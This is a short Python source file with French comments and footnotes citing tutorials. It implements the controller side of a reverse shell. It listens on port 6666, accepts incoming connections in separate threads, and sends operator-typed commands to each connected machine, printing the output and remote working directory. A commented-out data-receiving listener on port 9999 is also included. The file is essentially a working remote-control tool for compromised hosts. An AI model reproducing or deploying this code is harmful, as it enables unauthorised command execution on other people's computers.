#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import socket
import threading
import os
import platform


def clrscr():
        if platform.system() == "Linux":
            os.system("clear")
        elif platform.system() == "Windows":
            os.system("cls")

def incomingData(c, message):
    quitting = False
    while not quitting:
        if message == "exit":
            quitting = True
            c.close()
        else:
            print(message)
            message = c.recv(1024).decode('UTF-8')

def incomingReverseShell(c, message, SEP):

    quitting = False
    # Premier receive donne le current working directory
    cwd = c.recv(1024).decode('UTF-8')
    while not quitting:

        command = input(f"{cwd} $> ")
        if not command.strip():
            continue
        elif command.lower() == "cls" or command.lower() == "clear":
            clrscr()
            continue
        else:
            c.send(bytes(command, "UTF-8"))
            message = c.recv(1024).decode('UTF-8')
        
        if command.lower() == "exit":
            quitting = True
            c.close()
        else:    
            if len(message.split(SEP)) > 1:
                message, cwd = message.split(SEP)
            else:
                cwd = message
        print(message)

# Start two server Thread
# Receiving Data
# Receiving ReverseShell
def server():
    # [1]_ [2]_  

 # Starting data
    # c = None
    # addr = None
    # message = 'Waiting for connection'
    # s = socket.socket()
    # host = "0.0.0.0"
    # port = 9999
    # s.bind((host, port))
    # s.listen(5)

    # while True:
    #     c, addr = s.accept()
    #     print('Got connection from', addr)
    #     # On crée un thread receiving data
    #     connection_handler = threading.Thread(
    #         target=incomingData,
    #         args=(c, message,)
    #     )
    #     connection_handler.start()
    #     print("\n Nombre de Thread", threading.active_count())
 
 # Starting Reverse Shell
    c = None
    addr = None
    message = 'Waiting for connection'
    SEP = "<sep>"

    s = socket.socket()

    host = "0.0.0.0"
    port = 6666

    s.bind((host, port))
    s.listen(5)

    while True:
        c, addr = s.accept()
        print('Got connection from', addr)

        # On crée un thread receiving data
        connection_handler = threading.Thread(
            target=incomingReverseShell,
            args=(c, message, SEP,)
        )
        connection_handler.start()
        print("\n Nombre de Thread", threading.active_count())


if __name__ == "__main__":
   server()


'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
.. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
        Création d'un reverse shell

'''